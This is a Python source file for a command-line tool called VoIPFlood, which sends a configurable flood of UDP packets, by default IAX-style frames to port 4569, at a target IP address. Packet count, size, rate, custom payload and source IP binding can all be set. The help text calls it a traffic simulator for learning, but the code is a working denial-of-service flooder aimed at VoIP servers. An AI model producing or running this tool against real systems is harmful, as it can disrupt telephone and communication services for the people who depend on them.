import argparse
import logging
import socket
import sys
import time
from datetime import datetime
import binascii

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    handlers=[
        logging.FileHandler('voipflood.log'),
        logging.StreamHandler(sys.stdout)
    ]
)

class VoIPFlood:
    def __init__(self, target_ip, target_port=4569, packet_count=100, packet_size=100, rate=0.01, source_ip=None, payload=None, quiet=False):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packet_count = packet_count
        self.packet_size = packet_size
        self.rate = rate  # Seconds between packets
        self.source_ip = source_ip
        self.quiet = quiet
        self.payload = payload or self.default_payload()
        self.sent_packets = 0
        self.output_file = f"voipflood_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

    def default_payload(self):
        """Generate a simple IAX-like payload (simplified for educational use)."""
        # Basic IAX frame: 0x8000 (full frame, source call number), followed by dummy data
        try:
            base = "80000001" + "00" * (self.packet_size - 4)  # Simplified IAX header + padding
            return binascii.unhexlify(base[:self.packet_size * 2])
        except Exception as e:
            logging.error(f"Error generating default payload: {str(e)}")
            return b"\x00" * self.packet_size

    def send_packet(self, sock):
        """Send a single UDP packet."""
        try:
            sock.sendto(self.payload, (self.target_ip, self.target_port))
            self.sent_packets += 1
            logging.info(f"Sent packet {self.sent_packets} to {self.target_ip}:{self.target_port}, {len(self.payload)} bytes")
            with open(self.output_file, 'a') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Sent to {self.target_ip}:{self.target_port}, {len(self.payload)} bytes\n")
        except Exception as e:
            logging.error(f"Error sending packet: {str(e)}")

    def start(self):
        """Start flooding with UDP packets."""
        logging.info(f"Starting VoIPFlood: Target={self.target_ip}:{self.target_port}, Packets={self.packet_count}, Rate={self.rate}s")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        if self.source_ip:
            try:
                sock.bind((self.source_ip, 0))
            except Exception as e:
                logging.error(f"Error binding to source IP {self.source_ip}: {str(e)}")
                sock.close()
                return

        try:
            for _ in range(self.packet_count):
                self.send_packet(sock)
                time.sleep(self.rate)
        except KeyboardInterrupt:
            logging.info("VoIPFlood stopped by user")
        except Exception as e:
            logging.error(f"Error during flooding: {str(e)}")
        finally:
            sock.close()
            logging.info(f"Sent {self.sent_packets} packets. Results saved to {self.output_file}")

def main():
    parser = argparse.ArgumentParser(description="VoIPFlood - A tool to simulate VoIP traffic for learning.")
    parser.add_argument('target_ip', help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=4569, help='Target port (default: 4569 for IAX)')
    parser.add_argument('-c', '--count', type=int, default=100, help='Number of packets to send (default: 100)')
    parser.add_argument('-s', '--size', type=int, default=100, help='Packet size in bytes (default: 100)')
    parser.add_argument('-r', '--rate', type=float, default=0.01, help='Seconds between packets (default: 0.01)')
    parser.add_argument('-i', '--source-ip', help='Source IP address (optional)')
    parser.add_argument('-l', '--payload', help='Custom hex payload (e.g., 0x414243)')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode (log to file only)')

    args = parser.parse_args()

    if args.quiet:
        logging.getLogger().handlers = [logging.FileHandler('voipflood.log')]

    # Handle custom payload
    payload = None
    if args.payload:
        try:
            if args.payload.startswith('0x'):
                payload = binascii.unhexlify(args.payload[2:])
            else:
                payload = args.payload.encode('utf-8')
        except Exception as e:
            logging.error(f"Invalid payload format: {str(e)}")
            sys.exit(1)

    flooder = VoIPFlood(
        target_ip=args.target_ip,
        target_port=args.port,
        packet_count=args.count,
        packet_size=args.size,
        rate=args.rate,
        source_ip=args.source_ip,
        payload=payload,
        quiet=args.quiet
    )

    flooder.start()

if __name__ == "__main__":
    main()